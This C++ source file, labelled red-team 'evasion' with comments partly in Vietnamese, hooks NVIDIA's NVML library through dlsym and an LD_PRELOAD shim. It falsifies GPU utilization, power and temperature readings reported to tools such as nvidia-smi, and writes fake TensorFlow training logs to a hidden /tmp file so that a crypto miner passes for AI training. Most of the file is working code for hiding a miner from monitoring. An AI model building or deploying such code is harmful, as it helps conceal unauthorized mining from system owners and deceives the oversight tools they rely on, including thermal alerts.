#include "evasion.h"
#include <nvml.h>
#include <dlfcn.h>
#include <cstdio>
#include <cmath>
#include <random>
#include <ctime>

namespace redteam::evasion {

// ============================================================================
// NVML Function Pointers (For hooking)
// ============================================================================

// Original NVML functions (before hooking)
typedef nvmlReturn_t (*nvmlDeviceGetUtilizationRates_t)(nvmlDevice_t, nvmlUtilization_t*);
typedef nvmlReturn_t (*nvmlDeviceGetPowerUsage_t)(nvmlDevice_t, unsigned int*);
typedef nvmlReturn_t (*nvmlDeviceGetTemperature_t)(nvmlDevice_t, nvmlTemperatureSensors_t, unsigned int*);

static nvmlDeviceGetUtilizationRates_t real_nvmlDeviceGetUtilizationRates = nullptr;
static nvmlDeviceGetPowerUsage_t real_nvmlDeviceGetPowerUsage = nullptr;
static nvmlDeviceGetTemperature_t real_nvmlDeviceGetTemperature = nullptr;

static bool hooks_installed = false;

// ============================================================================
// Hook Installation
// ============================================================================

bool InstallNVMLHooks() {
    if (hooks_installed) {
        printf("[NVML-HOOK] Hooks already installed\n");
        return true;
    }

    printf("[NVML-HOOK] Installing NVML hooks for metrics obfuscation...\n");

    // Load real NVML library
    void* nvml_handle = dlopen("libnvidia-ml.so.1", RTLD_NOW | RTLD_GLOBAL);
    if (!nvml_handle) {
        fprintf(stderr, "[NVML-HOOK] Failed to load NVML library: %s\n", dlerror());
        return false;
    }

    // Get pointers to real NVML functions
    real_nvmlDeviceGetUtilizationRates = (nvmlDeviceGetUtilizationRates_t)
        dlsym(nvml_handle, "nvmlDeviceGetUtilizationRates");

    real_nvmlDeviceGetPowerUsage = (nvmlDeviceGetPowerUsage_t)
        dlsym(nvml_handle, "nvmlDeviceGetPowerUsage");

    real_nvmlDeviceGetTemperature = (nvmlDeviceGetTemperature_t)
        dlsym(nvml_handle, "nvmlDeviceGetTemperature");

    if (!real_nvmlDeviceGetUtilizationRates ||
        !real_nvmlDeviceGetPowerUsage ||
        !real_nvmlDeviceGetTemperature) {
        fprintf(stderr, "[NVML-HOOK] Failed to resolve NVML function pointers\n");
        return false;
    }

    hooks_installed = true;
    printf("[NVML-HOOK] Successfully hooked NVML functions ✓\n");

    // NOTE: Để hook hoạt động với external tools (nvidia-smi),
    // cần LD_PRELOAD shared library. Implementation này chỉ hook
    // trong process space của miner.

    printf("[NVML-HOOK] ⚠️ NOTE: Hooks chỉ affect in-process NVML calls\n");
    printf("[NVML-HOOK] Để hook nvidia-smi, cần LD_PRELOAD library\n");

    return true;
}

// ============================================================================
// Metrics Obfuscation Functions
// ============================================================================

double ThrottleReportedUtilization(double real_util, double reduction_factor) {
    // Reduce reported utilization
    // Example: 95% real -> 71% reported (với factor 0.75)

    double reported = real_util * reduction_factor;

    // Add small random jitter để tránh perfect correlation
    static std::mt19937 rng(time(nullptr));
    std::uniform_real_distribution<double> jitter(-3.0, 3.0);

    reported += jitter(rng);

    // Clamp to valid range [0, 100]
    reported = std::max(0.0, std::min(100.0, reported));

    return reported;
}

double AddPowerDrawNoise(double real_power_watts, double noise_amplitude) {
    // Add random noise to power draw
    // Mục tiêu: Tạo variation pattern giống AI training

    static std::mt19937 rng(time(nullptr) + getpid());
    std::normal_distribution<double> noise(0.0, noise_amplitude / 2.0);

    double noisy_power = real_power_watts + noise(rng);

    // Clamp to reasonable range (50W - 400W for typical GPUs)
    noisy_power = std::max(50.0, std::min(400.0, noisy_power));

    return noisy_power;
}

// ============================================================================
// Hooked NVML Functions (LD_PRELOAD implementation)
// ============================================================================

// NOTE: Đây là implementation cho LD_PRELOAD shared library.
// Để sử dụng, compile thành libfakenvidia-ml.so và:
// LD_PRELOAD=/path/to/libfakenvidia-ml.so nvidia-smi

#ifdef BUILD_NVML_SHIM

extern "C" {

/**
 * **Hooked nvmlDeviceGetUtilizationRates** (hook GPU utilization query)
 */
nvmlReturn_t nvmlDeviceGetUtilizationRates(nvmlDevice_t device, nvmlUtilization_t* utilization) {
    // Call real NVML function
    nvmlReturn_t ret = real_nvmlDeviceGetUtilizationRates(device, utilization);

    if (ret == NVML_SUCCESS && utilization != nullptr) {
        // Obfuscate reported utilization
        double original_gpu = utilization->gpu;
        double original_mem = utilization->memory;

        // Reduce by 25% (configurable)
        utilization->gpu = (unsigned int)ThrottleReportedUtilization(original_gpu, 0.75);
        utilization->memory = (unsigned int)ThrottleReportedUtilization(original_mem, 0.80);

        // Debug log (production should disable)
        if (getenv("DEBUG_NVML_HOOK")) {
            fprintf(stderr, "[NVML-HOOK] Util: %u%% -> %u%% (GPU), %u%% -> %u%% (Mem)\n",
                    original_gpu, utilization->gpu,
                    original_mem, utilization->memory);
        }
    }

    return ret;
}

/**
 * **Hooked nvmlDeviceGetPowerUsage** (hook power draw query)
 */
nvmlReturn_t nvmlDeviceGetPowerUsage(nvmlDevice_t device, unsigned int* power) {
    nvmlReturn_t ret = real_nvmlDeviceGetPowerUsage(device, power);

    if (ret == NVML_SUCCESS && power != nullptr) {
        unsigned int original_power = *power;

        // Add noise to power reading
        double power_watts = *power / 1000.0;  // mW to W
        double noisy_power = AddPowerDrawNoise(power_watts, 15.0);  // ±15W

        *power = (unsigned int)(noisy_power * 1000.0);  // W to mW

        if (getenv("DEBUG_NVML_HOOK")) {
            fprintf(stderr, "[NVML-HOOK] Power: %u mW -> %u mW\n", original_power, *power);
        }
    }

    return ret;
}

/**
 * **Hooked nvmlDeviceGetTemperature** (hook temperature query)
 */
nvmlReturn_t nvmlDeviceGetTemperature(nvmlDevice_t device, nvmlTemperatureSensors_t sensorType, unsigned int* temp) {
    nvmlReturn_t ret = real_nvmlDeviceGetTemperature(device, sensorType, temp);

    if (ret == NVML_SUCCESS && temp != nullptr) {
        // Optionally reduce reported temp để không trigger thermal alerts
        // Production miners thường KHÔNG làm điều này (nguy hiểm - có thể overheat)

        // For research: Report slightly lower temp (-2°C)
        if (*temp > 2) {
            *temp -= 2;
        }
    }

    return ret;
}

} // extern "C"

#endif // BUILD_NVML_SHIM

// ============================================================================
// Fake Metrics Generation (For workload simulation)
// ============================================================================

/**
 * **Generate Fake Training Metrics** (tạo metrics huấn luyện giả)
 *
 * Tạo log entries giống TensorFlow training để blend vào logs.
 */
void GenerateFakeTrainingMetrics(int epoch, int batch, double fake_loss, double fake_accuracy) {
    // Format giống TensorFlow logging
    printf("Epoch %d/%d - Batch %d - Loss: %.4f - Accuracy: %.4f - GPU: 78%%\n",
           epoch, 100, batch, fake_loss, fake_accuracy);

    // Fake metrics có thể ghi vào log file
    FILE* log = fopen("/tmp/.tf_training.log", "a");
    if (log) {
        time_t now = time(nullptr);
        fprintf(log, "[%ld] Epoch %d, Batch %d, Loss=%.4f, Acc=%.4f\n",
                now, epoch, batch, fake_loss, fake_accuracy);
        fclose(log);
    }
}

/**
 * **Simulate Training Progress** (mô phỏng tiến trình huấn luyện)
 *
 * Thread chạy background để periodically log fake training progress.
 */
void SimulateTrainingProgress() {
    static std::mt19937 rng(time(nullptr));
    std::uniform_real_distribution<double> loss_dist(0.1, 0.5);
    std::uniform_real_distribution<double> acc_dist(0.85, 0.95);

    for (int epoch = 1; epoch <= 100; epoch++) {
        for (int batch = 1; batch <= 1000; batch++) {
            // Generate fake metrics
            double fake_loss = loss_dist(rng);
            double fake_accuracy = acc_dist(rng);

            GenerateFakeTrainingMetrics(epoch, batch, fake_loss, fake_accuracy);

            // Sleep to simulate batch processing time (1-5 seconds)
            std::uniform_int_distribution<int> sleep_dist(1, 5);
            std::this_thread::sleep_for(std::chrono::seconds(sleep_dist(rng)));
        }
    }
}

} // namespace redteam::evasion
